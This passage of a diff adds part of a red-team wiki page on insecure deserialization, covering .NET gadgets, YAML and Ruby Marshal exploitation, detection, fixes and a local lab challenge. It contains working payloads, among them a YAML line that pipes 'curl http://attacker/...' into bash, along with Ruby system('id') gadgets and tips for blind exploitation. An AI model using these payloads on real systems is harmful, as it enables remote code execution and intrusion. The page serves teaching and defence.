+						<table>
+							<thead>
+								<tr>
+									<th align="center">Gadget</th>
+									<th align="center">Description</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>TextFormattingRunProperties</code></td>
+									<td align="center">Via<code>ObjectDataProvider</code>, calls arbitrary method</td>
+								</tr>
+								<tr>
+									<td align="center"><code>TypeConfuseDelegate</code></td>
+									<td align="center">Creates multicast delegate from two functions</td>
+								</tr>
+								<tr>
+									<td align="center"><code>WindowsIdentity</code></td>
+									<td align="center">Impersonation via<code>WindowsIdentity.GetCurrent()</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>DataSet</code></td>
+									<td align="center">Can cause SSRF via XML deserialization within deserialization</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="yaml-deserialization">YAML Deserialization</h3>
+						<p>
+							Py
+							<abbr title="Yet Another Markup Language">YAML</abbr>
+							's
+							<code>yaml.load()</code>
+							without specifying
+							<code>SafeLoader</code>
+							allows
+							creating arbitrary Python objects.
+						</p>
+						<pre class="python">
+import yaml
+
+# Vulnerable
+data = yaml.load(user_input)
+
+# Safe
+data = yaml.safe_load(user_input)
+						</pre>
+						<h4 id="exploitation">Exploitation</h4>
+						<pre class="yaml">
+!!python/object/apply:os.system
+args: [&#34;curl http://attacker/$(whoami) | bash&#34;]
+
+# Alternate with subprocess
+!!python/object/apply:subprocess.check_output
+args: [[&#34;id&#34;]]
+kwds: {shell: true}
+						</pre>
+						<p>
+							Ruby's
+							<abbr title="Yet Another Markup Language">YAML</abbr>
+							-based deserialization was exploited in the infamous
+							Rails
+							<abbr title="Common Vulnerabilities and Exposures">CVE</abbr>
+							s (
+							<abbr title="Common Vulnerabilities and Exposures">CVE</abbr>
+							-2013-0156):
+						</p>
+						<pre class="yaml">
+--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
+? |-
+  foo; eval(RUBY_PAYLOAD)
+: !ruby/object:ActionController::Routing::RouteSet
+						</pre>
+					</section>
+					<section>
+						<h3 id="ruby-marshal-deserialization">Ruby Marshal Deserialization</h3>
+						<p>
+							Ruby's
+							<code>Marshal.load</code>
+							is analogous to Python's pickle. Universal gadget chains exist.
+						</p>
+						<pre class="ruby">
+# Exploit via Ruby Marshal
+require &#39;base64&#39;
+
+# Gadget: Gem::Requirement → Gem::DependencyList → eval
+payload = Marshal.dump(
+  Gem::Requirement.new([&#34;system(&#39;id&#39;)&#34;])
+)
+puts Base64.strict_encode64(payload)
+						</pre>
+					</section>
+					<section>
+						<h3 id="detection">Detection</h3>
+						<h4 id="content-type-headers">Content-Type Headers</h4>
+						<p>Unusual Content-Type values often indicate serialization endpoints:</p>
+						<pre class="plaintext">
+application/x-java-serialized-object
+application/x-php-serialized
+application/x-python-pickle
+application/octet-stream
+application/x-www-form-urlencoded (with serialized payloads in parameters)
+						</pre>
+						<h4 id="base64-detection">Base64 Detection</h4>
+						<p>
+							Serialized payloads are frequently base64-encoded. Look for long base64 strings in: - Cookies
+							(especially
+							<code>user</code>
+							,
+							<code>session</code>
+							,
+							<code>data</code>
+							,
+							<code>state</code>
+							prefixed cookies) - POST body parameters (e.g.,
+							<code>data=rO0ABX...</code>
+							) - Hidden form fields -
+							<abbr title="Uniform Resource Locator">URL</abbr>
+							parameters
+						</p>
+						<h4 id="java-specific">Java-specific</h4>
+						<pre class="bash">
+# In a base64 cookie, decode and check for Java magic
+echo &#39;rO0ABXNy...&#39; | base64 -d | xxd -g 1 | head -1
+# Look for: 00000000: ac ed 00 05 ...
+
+# PHP-specific: look for serialize format markers
+echo &#39;Tzo2OiJVc2VyIjoy...&#39; | base64 -d
+# Look for: O:N:&#34;ClassName&#34;:N:{...}
+						</pre>
+						<h4 id="binary-scanning">Binary scanning</h4>
+						<pre class="bash">
+# Scan PCAP for Java serialization magic
+tcpdump -r capture.pcap -A 2&gt;/dev/null | grep -a &#39;ac ed 00 05&#39;
+
+# In a binary file
+xxd file.bin | grep &#39;aced 0005&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="fixes">Fixes</h3>
+						<p>
+							<b>Do not deserialize untrusted data.</b>
+							This is the only reliable fix. If you must handle serialized
+							data from clients, use safe data formats:
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							, Protocol Buffers,
+							MessagePack.
+						</p>
+						<h4 id="if-you-must-deserialize">If you must deserialize</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Language</th>
+									<th align="center">Fix</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">PHP</td>
+									<td align="center">Use<code>json_decode()</code>instead of<code>unserialize()</code>. Validate with<code>allowed_classes</code>in PHP 7+.</td>
+								</tr>
+								<tr>
+									<td align="center">Python</td>
+									<td align="center">Use<code>yaml.safe_load()</code>,<code>json.loads()</code>, or pickle with<code>Unpickler.find_class()</code>overridden.</td>
+								</tr>
+								<tr>
+									<td align="center">Java</td>
+									<td align="center">Use<code>ValidatingObjectInputStream</code>(Apache Commons IO),<code>ObjectInputFilter</code>(JEP 290, Java 9+).</td>
+								</tr>
+								<tr>
+									<td align="center">.NET</td>
+									<td align="center">Use<code>BinaryFormatter</code>allow lists. Migrate to<code>System.Text.Json</code>.</td>
+								</tr>
+								<tr>
+									<td align="center">Ruby</td>
+									<td align="center">Use<code>JSON.parse</code>or<code>YAML.safe_load</code>. Use<code>psych</code>safe loader.</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="java-objectinputfilter-example-java-9">Java ObjectInputFilter example (Java 9+)</h4>
+						<pre class="java">
+ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
+    &#34;com.example.safe.*;!*&#34;
+);
+ObjectInputStream ois = new ObjectInputStream(inputStream);
+ois.setObjectInputFilter(filter);
+						</pre>
+						<h4 id="python-unpickler-override">Python Unpickler override</h4>
+						<pre class="python">
+import pickle
+import io
+
+class SafeUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        if module == &#39;builtins&#39; and name in {&#39;int&#39;, &#39;str&#39;, &#39;list&#39;, &#39;dict&#39;}:
+            return getattr(__import__(module), name)
+        raise pickle.UnpicklingError(f&#39;Forbidden: {module}.{name}&#39;)
+
+SafeUnpickler(io.BytesIO(data)).load()
+						</pre>
+						<h4 id="hmac-signing-for-integrity">HMAC Signing for Integrity</h4>
+						<pre class="python">
+import hmac
+import hashlib
+import pickle
+
+def secure_dumps(obj, secret):
+    data = pickle.dumps(obj)
+    sig = hmac.new(secret, data, hashlib.sha256).hexdigest()
+    return sig + data.hex()
+
+def secure_loads(token, secret):
+    sig = token[:64]
+    data = bytes.fromhex(token[64:])
+    expected = hmac.new(secret, data, hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(sig, expected):
+        raise ValueError(&#39;Invalid signature&#39;)
+    return pickle.loads(data)
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<ol>
+							<li><b>Not confirming the vulnerability type first.</b> Use <abbr title="Uniform Resource Locator">URL</abbr>  <abbr title="Domain Name System">DNS</abbr> before attempting CommonsCollections <abbr title="Remote Code Execution">RCE</abbr> . Getting the wrong gadget chain crashes the target or produces visible errors.</li>
+						</ol>
+						<ol>
+							<li><b>Forgetting to encode the payload correctly.</b> Some endpoints expect raw bytes, others expect base64, hex, or <abbr title="Uniform Resource Locator">URL</abbr> -encoded base64. Test each.</li>
+						</ol>
+						<ol>
+							<li><b>Using a gadget chain that the target doesn't have the libraries for.</b> Find framework versions first. Run <code>filters/src/main/resources</code> or examine <abbr title="Hypertext Transfer Protocol">HTTP</abbr> response headers for library info.</li>
+						</ol>
+						<ol>
+							<li><b>Triggering deserialization but the object isn't used.</b> In <abbr title="PHP Hypertest Preprocessor">PHP</abbr> , <code>unserialize()</code> alone may not trigger <code>__destruct()</code> if the object is discarded. The object must reach end-of-life in the script.</li>
+						</ol>
+						<ol>
+							<li><b>Firewall blocks outbound connections.</b> In blind deserialization, your payload's network call may be blocked. Test with <abbr title="Domain Name System">DNS</abbr> first ( <abbr title="User Datagram Protocol">UDP</abbr> port 53, often allowed).</li>
+						</ol>
+						<ol>
+							<li><b>PHP deserialization with private/protected properties.</b> These require null bytes in the serialized string. Use Python or a hex editor to construct them:</li>
+						</ol>
+						<pre class="python">
+# Protected property: \x00*\x00property_name
+# Private property: \x00ClassName\x00property_name
+payload = b&#39;O:6:&#34;Logger&#34;:2:{s:12:&#34;\x00*\x00log_file&#34;;s:4:&#34;test&#34;;s:14:&#34;\x00Logger\x00message&#34;;s:6:&#34;hello&#34;;}&#39;
+						</pre>
+						<ol>
+							<li><b>Ignore the 'sleep' magic method.</b> Before <code>serialize()</code> is called, <code>__sleep()</code> runs. You can chain through it if it returns interesting properties or triggers side effects.</li>
+						</ol>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							The companion container runs three vulnerable endpoints: a Python Flask app that unpickles a
+							cookie, a Java Tomcat servlet that calls
+							<code>ObjectInputStream.readObject()</code>
+							, and a
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							Apache host that calls
+							<code>unserialize()</code>
+							. Build it, identify each endpoint, and use the matching
+							gadget tool to reach code execution.
+						</p>
+						<p><a href="/wiki/articles/redteam/deserialization.Containerfile">deserialization.Containerfile</a></p>
+						<pre class="bash">
+podman build -t deser-lab -f deserialization.Containerfile .
+
+podman run -d --name deser-lab \
+    -p 5000:5000 -p 8080:8080 -p 8081:8081 \
+    deser-lab
+
+# Python Flask (pickle): http://localhost:5000
+# Java Tomcat (ObjectInputStream): http://localhost:8080/deser/api
+# PHP Apache (unserialize): http://localhost:8081
+						</pre>
+						<p>
+							Build the pickle payload with
+							<code>__reduce__</code>
+							, the Java payload with
+							<code>ysoserial</code>
+							, and the
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							payload with
+							<code>phpggc</code>
+							, then submit each one to its endpoint and confirm execution with a callback
+							or a file write.
+						</p>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank">OWASP Deserialization Cheat Sheet</a> - language-specific prevention guidance</li>
+							<li><a class="icon-github" href="https://github.com/frohoff/ysoserial" target="_blank">ysoserial</a> - Java deserialization payload generator</li>
+							<li><a class="icon-github" href="https://github.com/ambionics/phpggc" target="_blank">PHPGGC</a> - <abbr title="PHP Hypertest Preprocessor">PHP</abbr> generic gadget chain generator</li>
+							<li><a class="icon-website" href="https://cwe.mitre.org/data/definitions/502.html" target="_blank">CWE-502: Deserialization of Untrusted Data</a> - weakness definition and examples</li>
+							<li><a class="icon-website" href="https://docs.python.org/3/library/pickle.html" target="_blank">pickle - Python object serialization</a> - the module and its security warning</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
